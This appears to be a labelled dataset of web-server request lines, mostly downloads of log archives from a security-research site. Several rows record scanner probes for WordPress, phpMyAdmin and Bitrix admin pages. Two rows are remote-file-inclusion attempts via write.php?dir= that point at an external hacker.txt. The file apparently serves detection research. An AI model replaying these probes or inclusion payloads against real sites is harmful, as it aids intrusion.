47,1,200,0,GET /self.logs/error.log.2015-08-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-13.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-15.gz HTTP/1.1
33,1,404,0,HEAD /modules/README.txt HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-22.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-09.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-22.gz HTTP/1.1
19,1,404,0,GET /site/ HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-17.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-02.gz HTTP/1.1
38,1,200,0,GET /maccdc2012/notice.log.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-09.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-01.gz HTTP/1.1
25,1,404,0,GET /fmaccdc2012 HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-29.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-01.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-01-17.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-14.gz HTTP/1.1
19,1,301,0,GET /user/ HTTP/1.0
19,1,404,0,GET /user/ HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-15.gz HTTP/1.1
35,1,200,0,GET /maccdc2012/dns.log.gz HTTP/1.1
35,1,200,0,GET /maccdc2012/dns.log.gz HTTP/1.0
47,1,200,0,GET /self.logs/error.log.2016-03-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-17.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-01-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-01-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-05.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-25.gz HTTP/1.1
23,1,404,0,GET /admin.php HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-25.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-01-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-14.gz HTTP/1.1
60,1,404,0,GET /wp-content/upgrade/theme-compat/popup-pomo.php HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-31.gz HTTP/1.1
195,4,404,1,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf&amp;sa=U&amp;ved=0ahUKEwidnb6F5oXRAhVS5mMKHVRvDdsQFgiQAjA3&amp;usg=AFQjCNECd9WKWE5QQr2RPFKoA-ce5IW95w//write.php?dir=remote?? HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-24.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-01-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-01-17.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-12.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-09.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-09.gz HTTP/1.1
15,1,304,0,HEAD / HTTP/1.1
38,1,404,0,GET /access.log.2015-02-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-25.gz HTTP/1.1
44,1,404,0,GET /bitrix/admin/index.php?lang=en HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-14.gz HTTP/1.1
26,1,404,0,HEAD /sitemap.xml HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-14.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-01-24.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-02.gz HTTP/1.1
30,1,404,0,GET /plus/img/wbg.gif HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-30.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-01-27.gz HTTP/1.1
34,1,200,0,GET /auth.log/auth.log.gz HTTP/1.1
26,1,404,0,GET /wp-login.php HTTP/1.0
47,1,200,0,GET /self.logs/error.log.2016-11-08.gz HTTP/1.1
51,1,404,1,GET /honeypot//%22http://glastopf.org//%22 HTTP/1.0
51,1,404,1,GET /honeypot//%22http://glastopf.org//%22 HTTP/1.1
18,1,404,0,GET /aaa/ HTTP/1.1
26,1,404,0,GET /wp-login.php HTTP/1.1
22,1,200,0,GET /tg/b.zip HTTP/1.1
31,1,404,0,GET /browserconfig.xml HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-19.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-10.gz HTTP/1.1
48,1,404,0,GET /self.logs/access.log.2015-01-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-09-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-04-17.gz HTTP/1.1
44,1,200,0,GET /self.logs/error.log.2016-01-22 HTTP/1.1
44,1,200,0,GET /self.logs/error.log.2016-01-22 HTTP/1.0
48,1,200,0,GET /self.logs/access.log.2015-04-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-06-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-18.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-01-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-07.gz HTTP/1.1
19,1,404,0,GET /shop/ HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-09.gz HTTP/1.1
43,1,200,0,GET /misc/zeus_dga_domains.txt.zip HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-12-12.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-03-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-16.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-03-20.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-09-03.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-24.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-05-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-08-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-04.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-15.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-11-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-13.gz HTTP/1.1
24,1,301,0,GET /maccdc2012 HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-01-21.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-20.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-31.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-09.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-19.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-26.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-03-30.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-06.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-02-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-17.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-06-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-12-10.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-08-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-12-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-24.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-02.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-10-02.gz HTTP/1.1
51,1,404,1,GET /honeypot/phpmyadmin/scripts/setup.php HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-05.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-17.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-26.gz HTTP/1.1
54,1,404,1,GET /honeypot/mysql/scripts/db_setup.init.php HTTP/1.1
33,1,301,0,GET /wordpress/wp-admin/ HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-01-27.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-03-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-11-18.gz HTTP/1.1
35,1,200,0,GET /maccdc2012/ssl.log.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-22.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-23.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-09-04.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-28.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-04-10.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-09.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-24.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-06-25.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-28.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-01-25.gz HTTP/1.1
38,1,404,0,GET /access.log.2015-02-13.gz HTTP/1.1
47,1,301,0,GET /self.logs/error.log.2015-10-23.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-05-17.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-16.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-10-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-11.gz HTTP/1.1
14,1,200,0,GET / HTTP/1.1
14,1,200,0,GET / HTTP/1.0
47,1,200,0,GET /self.logs/error.log.2016-03-08.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-07.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-02-17.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-01-24.gz HTTP/1.1
15,1,206,0,GET /# HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-11-11.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-10-15.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-08-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-11-02.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-12-29.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-07-31.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-07-27.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-02-01.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-02-13.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-04-19.gz HTTP/1.1
18,1,404,1,GET /sql/ HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-04-15.gz HTTP/1.1
33,1,200,0,GET /tg/tg_snort_fast.7z HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-05-28.gz HTTP/1.1
32,1,200,0,GET /self.logs/?C=N;O=A HTTP/1.0
47,1,200,0,GET /self.logs/error.log.2015-05-14.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-07-03.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-08-08.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-01-06.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2016-07-07.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2015-05-11.gz HTTP/1.1
48,1,200,0,GET /self.logs/access.log.2015-06-21.gz HTTP/1.1
47,1,200,0,GET /self.logs/error.log.2016-09-09.gz HTTP/1.1
111,1,404,0,GET //write.php?dir=http://www.kennyagrisoft.com//wp-content/themes/DynamiX/lib/scripts/hacker.txt???? HTTP/1.1
